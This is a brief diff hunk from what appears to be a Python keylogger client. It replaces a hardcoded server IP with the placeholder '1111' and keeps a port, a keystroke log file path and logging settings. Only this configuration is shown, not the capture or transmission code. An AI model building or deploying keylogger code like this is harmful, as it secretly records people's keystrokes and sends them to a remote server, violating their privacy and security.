@@ -9,7 +9,7 @@ import os
 
 PORT = 5050
 
-SERVER = "196.129.32.188"
+SERVER = "1111"
 ADDR = (SERVER, PORT)
 keylog ='E:\\key.txt'
 logging.basicConfig(filename=keylog, level=logging.DEBUG, format='%(asctime)s - %(message)s')
